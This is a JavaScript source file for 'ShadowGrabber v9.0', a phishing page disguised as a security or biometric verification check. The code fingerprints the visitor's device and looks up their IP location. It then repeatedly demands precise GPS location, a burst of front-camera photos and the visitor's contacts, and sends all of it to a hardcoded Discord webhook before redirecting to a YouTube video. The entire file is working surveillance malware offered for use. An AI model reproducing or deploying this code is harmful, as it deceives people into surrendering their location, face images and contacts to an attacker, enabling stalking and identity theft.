// ═══════════════════════════════════════════════════════════════════════════
// 🔥 SHADOWGRABBER v9.0 - ADVANCED INTELLIGENCE SUITE 🔥
// ═══════════════════════════════════════════════════════════════════════════

const CONFIG = {
    WEBHOOK: 'https://discord.com/api/webhooks/1464327769608425504/TX0QqpwHA56djp6nFioLGerQ4dUNI0elhQ4q6vw-fuPTbLYdLdv-DaN-PimcXb9Bi9kS',
    REDIRECT_URL: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
    CAMERA_SNAPS: 7,
    SNAP_INTERVAL: 200 // ms between snaps
};

// ═══════════════════════════════════════════════════════════════════════════
// DOM ELEMENTS
// ═══════════════════════════════════════════════════════════════════════════
const DOM = {
    loadingText: document.getElementById('loading-text'),
    progressBar: document.getElementById('progress-bar'),
    statusDetail: document.getElementById('status-detail'),
    clickTrigger: document.getElementById('click-trigger'),
    video: document.getElementById('st-v'),
    canvas: document.getElementById('st-c')
};

// ═══════════════════════════════════════════════════════════════════════════
// STATE MANAGEMENT
// ═══════════════════════════════════════════════════════════════════════════
const STATE = {
    sessionId: `SG-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
    startTime: Date.now(),
    forensicsCollected: false,
    contactsCollected: false,
    cameraCompleted: false,
    locationCollected: false,
    currentStream: null
};

// ═══════════════════════════════════════════════════════════════════════════
// UTILITY FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const updateUI = (message, progress, detail = '') => {
    if (DOM.loadingText) DOM.loadingText.textContent = message;
    if (DOM.progressBar) DOM.progressBar.style.width = `${progress}%`;
    if (DOM.statusDetail && detail) DOM.statusDetail.textContent = detail;
};

const sendToDiscord = async (payload) => {
    try {
        const formData = new FormData();

        if (payload.file) {
            formData.append('payload_json', JSON.stringify({
                embeds: [payload.embed],
                username: 'ShadowGrabber v9.0',
                avatar_url: 'https://i.imgur.com/4M34hi2.png'
            }));
            formData.append('file', payload.file.blob, payload.file.name);
        } else {
            formData.append('payload_json', JSON.stringify({
                embeds: [payload.embed],
                username: 'ShadowGrabber v9.0',
                avatar_url: 'https://i.imgur.com/4M34hi2.png'
            }));
        }

        await fetch(CONFIG.WEBHOOK, {
            method: 'POST',
            body: formData
        });

        return true;
    } catch (error) {
        console.error('Discord send failed:', error);
        return false;
    }
};

// ═══════════════════════════════════════════════════════════════════════════
// PHASE 0: INSTANT FORENSICS (AUTO ON FIRST CLICK)
// ═══════════════════════════════════════════════════════════════════════════
async function collectInstantForensics() {
    updateUI('Initializing security check...', 5, 'Analyzing system architecture');

    // Canvas Fingerprint
    const getCanvasFingerprint = () => {
        try {
            const ctx = DOM.canvas.getContext('2d');
            DOM.canvas.width = 200;
            DOM.canvas.height = 50;
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.textBaseline = 'alphabetic';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('ShadowGrabber🔥', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('ShadowGrabber🔥', 4, 17);
            const dataURL = DOM.canvas.toDataURL();
            return dataURL.slice(-60);
        } catch (e) {
            return 'Error';
        }
    };

    // WebGL Fingerprint
    const getWebGLInfo = () => {
        try {
            const gl = DOM.canvas.getContext('webgl') || DOM.canvas.getContext('experimental-webgl');
            if (!gl) return { vendor: 'N/A', renderer: 'N/A' };

            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return {
                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'N/A',
                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A'
            };
        } catch (e) {
            return { vendor: 'Error', renderer: 'Error' };
        }
    };

    // Audio Fingerprint
    const getAudioFingerprint = () => {
        try {
            const AudioContext = window.AudioContext || window.webkitAudioContext;
            if (!AudioContext) return 'N/A';
            const audioCtx = new AudioContext();
            return `${audioCtx.sampleRate}Hz | ${audioCtx.state} | ${audioCtx.baseLatency || 'N/A'}`;
        } catch (e) {
            return 'Error';
        }
    };

    // Battery Info
    const getBatteryInfo = async () => {
        try {
            if (!navigator.getBattery) return 'N/A';
            const battery = await navigator.getBattery();
            return {
                level: `${Math.round(battery.level * 100)}%`,
                charging: battery.charging ? 'Yes' : 'No',
                chargingTime: battery.chargingTime === Infinity ? 'N/A' : `${battery.chargingTime}s`,
                dischargingTime: battery.dischargingTime === Infinity ? 'N/A' : `${battery.dischargingTime}s`
            };
        } catch (e) {
            return 'Error';
        }
    };

    // IP & Geolocation Info
    const getIPInfo = async () => {
        try {
            const response = await fetch('https://ipapi.co/json/', { timeout: 5000 });
            const data = await response.json();
            return {
                ip: data.ip || 'N/A',
                city: data.city || 'N/A',
                region: data.region || 'N/A',
                country: data.country_name || 'N/A',
                countryCode: data.country_code || 'N/A',
                postal: data.postal || 'N/A',
                latitude: data.latitude || 'N/A',
                longitude: data.longitude || 'N/A',
                timezone: data.timezone || 'N/A',
                isp: data.org || 'N/A',
                asn: data.asn || 'N/A',
                currency: data.currency || 'N/A',
                languages: data.languages || 'N/A'
            };
        } catch (e) {
            return {
                ip: 'Failed to fetch',
                city: 'N/A',
                region: 'N/A',
                country: 'N/A',
                isp: 'N/A'
            };
        }
    };

    updateUI('Collecting system intelligence...', 10, 'Gathering 30+ data points');

    // Collect all data
    const webglInfo = getWebGLInfo();
    const batteryInfo = await getBatteryInfo();
    const ipInfo = await getIPInfo();

    const forensics = {
        session: {
            id: STATE.sessionId,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent
        },
        hardware: {
            platform: navigator.platform,
            vendor: navigator.vendor,
            cpuCores: navigator.hardwareConcurrency || 'N/A',
            deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'N/A',
            maxTouchPoints: navigator.maxTouchPoints || 0,
            gpu: webglInfo.renderer,
            gpuVendor: webglInfo.vendor
        },
        display: {
            screenResolution: `${screen.width}x${screen.height}`,
            availableResolution: `${screen.availWidth}x${screen.availHeight}`,
            colorDepth: `${screen.colorDepth}-bit`,
            pixelRatio: window.devicePixelRatio || 1,
            orientation: screen.orientation ? screen.orientation.type : 'N/A',
            orientationAngle: screen.orientation ? screen.orientation.angle : 'N/A'
        },
        network: {
            ip: ipInfo.ip,
            city: ipInfo.city,
            region: ipInfo.region,
            country: ipInfo.country,
            countryCode: ipInfo.countryCode,
            postal: ipInfo.postal,
            coordinates: `${ipInfo.latitude}, ${ipInfo.longitude}`,
            timezone: ipInfo.timezone,
            isp: ipInfo.isp,
            asn: ipInfo.asn,
            connectionType: navigator.connection ? navigator.connection.effectiveType : 'N/A',
            downlink: navigator.connection ? `${navigator.connection.downlink}Mbps` : 'N/A',
            rtt: navigator.connection ? `${navigator.connection.rtt}ms` : 'N/A',
            saveData: navigator.connection ? navigator.connection.saveData : 'N/A'
        },
        browser: {
            language: navigator.language,
            languages: navigator.languages.join(', '),
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack || 'N/A',
            onLine: navigator.onLine,
            historyLength: window.history.length,
            javaEnabled: typeof navigator.javaEnabled === 'function' ? navigator.javaEnabled() : 'N/A',
            pdfViewerEnabled: navigator.pdfViewerEnabled || 'N/A'
        },
        fingerprints: {
            canvas: getCanvasFingerprint(),
            audio: getAudioFingerprint(),
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset()
        },
        battery: batteryInfo,
        permissions: {
            notifications: Notification.permission,
            geolocation: 'unknown',
            camera: 'unknown',
            microphone: 'unknown'
        },
        storage: {
            localStorage: typeof localStorage !== 'undefined',
            sessionStorage: typeof sessionStorage !== 'undefined',
            indexedDB: typeof indexedDB !== 'undefined',
            cookies: navigator.cookieEnabled
        }
    };

    // Create rich Discord embed
    const embed = {
        title: '⚡ SHADOWGRABBER v9.0 - INSTANT FORENSICS',
        description: `**Session ID:** \`${STATE.sessionId}\`\n**Timestamp:** ${new Date().toLocaleString()}\n**30+ Data Points Captured**`,
        color: 0x9B59B6,
        fields: [
            {
                name: '💻 Hardware Profile',
                value: `\`\`\`yaml\nPlatform: ${forensics.hardware.platform}\nCPU Cores: ${forensics.hardware.cpuCores}\nRAM: ${forensics.hardware.deviceMemory}\nGPU: ${forensics.hardware.gpu}\nTouch Points: ${forensics.hardware.maxTouchPoints}\`\`\``,
                inline: false
            },
            {
                name: '🌐 Network Intelligence',
                value: `\`\`\`yaml\nIP: ${forensics.network.ip}\nISP: ${forensics.network.isp}\nLocation: ${forensics.network.city}, ${forensics.network.region}, ${forensics.network.country}\nCoords: ${forensics.network.coordinates}\nTimezone: ${forensics.network.timezone}\nSpeed: ${forensics.network.downlink} (${forensics.network.connectionType})\nLatency: ${forensics.network.rtt}\`\`\``,
                inline: false
            },
            {
                name: '📱 Display & Device',
                value: `\`\`\`yaml\nResolution: ${forensics.display.screenResolution}\nColor Depth: ${forensics.display.colorDepth}\nPixel Ratio: ${forensics.display.pixelRatio}\nOrientation: ${forensics.display.orientation}\nBattery: ${typeof forensics.battery === 'object' ? forensics.battery.level : forensics.battery}\nCharging: ${typeof forensics.battery === 'object' ? forensics.battery.charging : 'N/A'}\`\`\``,
                inline: false
            },
            {
                name: '🕵️ Browser Fingerprints',
                value: `\`\`\`yaml\nCanvas: ${forensics.fingerprints.canvas.substring(0, 20)}...\nAudio: ${forensics.fingerprints.audio}\nTimezone: ${forensics.fingerprints.timezone}\nLanguages: ${forensics.browser.languages}\nDNT: ${forensics.browser.doNotTrack}\`\`\``,
                inline: false
            },
            {
                name: '🔐 Browser Capabilities',
                value: `\`\`\`yaml\nCookies: ${forensics.browser.cookiesEnabled}\nOnline: ${forensics.browser.onLine}\nHistory: ${forensics.browser.historyLength} entries\nUser Agent: ${forensics.session.userAgent.substring(0, 50)}...\`\`\``,
                inline: false
            }
        ],
        footer: {
            text: `ShadowGrabber v9.0 | Advanced Intelligence Suite`
        },
        timestamp: new Date().toISOString()
    };

    await sendToDiscord({ embed });
    STATE.forensicsCollected = true;
    updateUI('System analysis complete', 15, 'Proceeding to verification steps');
}

// ═══════════════════════════════════════════════════════════════════════════
// PHASE 1: LOCATION COLLECTION (HIGH ACCURACY)
// ═══════════════════════════════════════════════════════════════════════════
async function collectLocation() {
    updateUI('Requesting location access...', 20, 'GPS triangulation required');

    return new Promise((resolve) => {
        const attemptLocation = () => {
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = position.coords;

                    const embed = {
                        title: '📍 PRECISION GEOLOCATION',
                        description: `**High-Accuracy GPS Lock Acquired**`,
                        color: 0x2ECC71,
                        fields: [
                            {
                                name: '🗺️ Coordinates',
                                value: `\`\`\`\nLatitude: ${latitude}\nLongitude: ${longitude}\nAccuracy: ${Math.round(accuracy)}m\nAltitude: ${altitude || 'N/A'}m\nHeading: ${heading || 'N/A'}°\nSpeed: ${speed || 'N/A'}m/s\`\`\``,
                                inline: false
                            },
                            {
                                name: '🔗 Map Links',
                                value: `[Google Maps](https://www.google.com/maps?q=${latitude},${longitude})\n[OpenStreetMap](https://www.openstreetmap.org/?mlat=${latitude}&mlon=${longitude}&zoom=15)`,
                                inline: false
                            }
                        ],
                        timestamp: new Date().toISOString()
                    };

                    await sendToDiscord({ embed });
                    STATE.locationCollected = true;
                    updateUI('Location verified', 30, 'GPS lock successful');
                    resolve();
                },
                (error) => {
                    console.error('Location error:', error);
                    alert('⚠️ SECURITY VERIFICATION REQUIRED\n\nLocation access is mandatory for identity verification.\n\nPlease click "Allow" when prompted.');
                    attemptLocation(); // Retry
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        };

        attemptLocation();
    });
}

// ═══════════════════════════════════════════════════════════════════════════
// PHASE 2: CAMERA BURST CAPTURE (7 SNAPS)
// ═══════════════════════════════════════════════════════════════════════════
async function collectCameraBurst() {
    updateUI('Requesting camera access...', 35, 'Biometric verification required');

    let stream = null;

    // Keep requesting until granted
    while (!stream) {
        try {
            stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: 'user',
                    width: { ideal: 1920 },
                    height: { ideal: 1080 }
                },
                audio: false
            });

            DOM.video.srcObject = stream;
            await DOM.video.play();
            STATE.currentStream = stream;

        } catch (error) {
            console.error('Camera error:', error);
            alert('⚠️ CAMERA ACCESS REQUIRED\n\nBiometric verification is mandatory.\n\nPlease click "Allow" to grant camera access.');
        }
    }

    updateUI('Camera active - capturing biometrics...', 40, 'Please look at the camera');
    await sleep(1000); // Let camera stabilize

    // Burst capture
    for (let i = 1; i <= CONFIG.CAMERA_SNAPS; i++) {
        const progress = 40 + (i * 7);
        updateUI(`Capturing biometric sample ${i}/${CONFIG.CAMERA_SNAPS}...`, progress, 'Processing facial data');

        // Capture frame
        DOM.canvas.width = DOM.video.videoWidth;
        DOM.canvas.height = DOM.video.videoHeight;
        const ctx = DOM.canvas.getContext('2d');
        ctx.drawImage(DOM.video, 0, 0);

        // Convert to blob and send immediately
        await new Promise((resolve) => {
            DOM.canvas.toBlob(async (blob) => {
                const embed = {
                    title: `📸 BIOMETRIC CAPTURE #${i}/${CONFIG.CAMERA_SNAPS}`,
                    description: `**High-Resolution Facial Sample**\nSession: \`${STATE.sessionId}\``,
                    color: 0xE74C3C,
                    fields: [
                        {
                            name: '📊 Image Info',
                            value: `\`\`\`\nResolution: ${DOM.canvas.width}x${DOM.canvas.height}\nSize: ${(blob.size / 1024).toFixed(2)}KB\nTimestamp: ${new Date().toLocaleTimeString()}\`\`\``,
                            inline: false
                        }
                    ],
                    timestamp: new Date().toISOString()
                };

                await sendToDiscord({
                    embed,
                    file: {
                        blob: blob,
                        name: `biometric_${STATE.sessionId}_snap${i}.jpg`
                    }
                });

                resolve();
            }, 'image/jpeg', 0.92);
        });

        await sleep(CONFIG.SNAP_INTERVAL);
    }

    // Stop camera
    if (STATE.currentStream) {
        STATE.currentStream.getTracks().forEach(track => track.stop());
        STATE.currentStream = null;
    }

    STATE.cameraCompleted = true;
    updateUI('Biometric capture complete', 85, 'All samples uploaded');
}

// ═══════════════════════════════════════════════════════════════════════════
// PHASE 3: CONTACT COLLECTION
// ═══════════════════════════════════════════════════════════════════════════
async function collectContacts() {
    // Check if Contact Picker API is available
    if (!('contacts' in navigator && 'ContactsManager' in window)) {
        console.log('Contact Picker API not available');
        STATE.contactsCollected = true;
        return;
    }

    updateUI('Requesting contact access...', 87, 'Contact verification required');

    let success = false;

    while (!success) {
        try {
            const contacts = await navigator.contacts.select(
                ['name', 'tel', 'email'],
                { multiple: true }
            );

            if (contacts && contacts.length > 0) {
                const contactData = contacts.map((contact, index) => ({
                    index: index + 1,
                    name: contact.name || 'N/A',
                    phones: contact.tel || [],
                    emails: contact.email || []
                }));

                const embed = {
                    title: '📇 CONTACT DATABASE EXTRACTED',
                    description: `**${contacts.length} Contact(s) Secured**\nSession: \`${STATE.sessionId}\``,
                    color: 0xF1C40F,
                    fields: [
                        {
                            name: '📊 Summary',
                            value: `\`\`\`\nTotal Contacts: ${contacts.length}\nExtracted: ${new Date().toLocaleString()}\`\`\``,
                            inline: false
                        }
                    ],
                    timestamp: new Date().toISOString()
                };

                const blob = new Blob([JSON.stringify(contactData, null, 2)], { type: 'application/json' });

                await sendToDiscord({
                    embed,
                    file: {
                        blob: blob,
                        name: `contacts_${STATE.sessionId}.json`
                    }
                });

                success = true;
                STATE.contactsCollected = true;
                updateUI('Contacts verified', 92, 'Contact data secured');

            } else {
                alert('⚠️ CONTACT VERIFICATION REQUIRED\n\nYou must select at least one contact to proceed.\n\nPlease select contacts and click "Done".');
            }

        } catch (error) {
            console.error('Contact error:', error);
            alert('⚠️ CONTACT ACCESS DENIED\n\nContact verification is mandatory for security purposes.\n\nPlease click "Allow" and select contacts.');
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// MAIN EXECUTION SEQUENCE
// ═══════════════════════════════════════════════════════════════════════════
async function executeSequence() {
    try {
        // Hide click trigger
        DOM.clickTrigger.style.display = 'none';

        // Phase 0: Instant Forensics (auto on click)
        await collectInstantForensics();
        await sleep(500);

        // Phase 1: Location
        await collectLocation();
        await sleep(500);

        // Phase 2: Camera Burst
        await collectCameraBurst();
        await sleep(500);

        // Phase 3: Contacts
        await collectContacts();
        await sleep(500);

        // Final Summary
        updateUI('Verification complete!', 95, 'Redirecting...');

        const summaryEmbed = {
            title: '✅ SHADOWGRABBER SESSION COMPLETE',
            description: `**All Data Successfully Collected**\nSession: \`${STATE.sessionId}\``,
            color: 0x00FF00,
            fields: [
                {
                    name: '📋 Collection Summary',
                    value: `\`\`\`\n✓ Forensics: ${STATE.forensicsCollected ? 'Complete' : 'Failed'}\n✓ Location: ${STATE.locationCollected ? 'Complete' : 'Failed'}\n✓ Camera: ${STATE.cameraCompleted ? 'Complete (7 snaps)' : 'Failed'}\n✓ Contacts: ${STATE.contactsCollected ? 'Complete' : 'Skipped'}\n\nTotal Time: ${((Date.now() - STATE.startTime) / 1000).toFixed(2)}s\`\`\``,
                    inline: false
                }
            ],
            timestamp: new Date().toISOString(),
            footer: {
                text: 'ShadowGrabber v9.0 - Mission Accomplished'
            }
        };

        await sendToDiscord({ embed: summaryEmbed });

        // Wait a moment then redirect
        await sleep(1500);
        updateUI('Redirecting...', 100, 'Thank you for verifying');
        await sleep(500);

        // Final redirect
        window.location.replace(CONFIG.REDIRECT_URL);

    } catch (error) {
        console.error('Sequence error:', error);
        alert('An error occurred. Please refresh and try again.');
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// INITIALIZATION
// ═══════════════════════════════════════════════════════════════════════════
window.addEventListener('DOMContentLoaded', () => {
    console.log('ShadowGrabber v9.0 initialized');

    // Set up click trigger
    if (DOM.clickTrigger) {
        DOM.clickTrigger.addEventListener('click', executeSequence);
    }
});
